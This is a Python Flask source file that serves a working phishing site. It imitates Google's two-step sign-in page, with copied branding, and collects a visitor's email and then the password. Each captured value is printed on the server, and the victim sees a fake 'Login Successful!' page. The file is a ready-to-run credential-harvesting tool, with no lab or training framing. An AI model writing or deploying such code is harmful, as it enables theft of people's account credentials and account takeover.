from flask import Flask, render_template_string, request

app = Flask(__name__)
Email_Html = """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }
        h2 { font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .create-account { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <h2>Sign in</h2>
        <p>Use your Google Account</p>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="Email or phone" required>
            <div class="btn-container">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
"""
Password_Html = """
<!DOCTYPE html>
<html>
<head>
    <title>Welcome - Google Accounts</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
        .logo span:nth-child(1) { color: #4285F4; }
        .logo span:nth-child(2) { color: #EA4335; }
        .logo span:nth-child(3) { color: #FBBC05; }
        .logo span:nth-child(4) { color: #4285F4; }
        .logo span:nth-child(5) { color: #34A853; }
        .logo span:nth-child(6) { color: #EA4335; }
        h2 { font-weight: 400; color: #202124; margin-bottom: 8px; }
        .user-pill { display: inline-block; padding: 4px 12px; border: 1px solid #dadce0; border-radius: 20px; font-size: 13px; color: #202124; margin-bottom: 20px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; margin-top: 10px; }
        input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
        .forgot-pass { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
        <h2>Welcome</h2>
        <div class="user-pill">👤 {{ email }}</div>
        
        <form action="/auth" method="POST">
            <input type="hidden" name="email" value="{{ email }}">
            <input type="password" name="password" placeholder="Enter your password" required>
            <div class="btn-container">
                <a href="#" class="forgot-pass">Forgot password?</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
@app.route("/login", methods=["POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        print(f"Captured Email -> {email}")
        return render_template_string(Password_Html, email=email)
    
    return render_template_string(Email_Html)

@app.route("/auth", methods=["POST"])
def auth():
    email = request.form.get("email")
    password = request.form.get("password")
    print(f"Captured Final Login -> Email: {email}, Password: {password}")
    return "<h1>Login Successful!</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
    
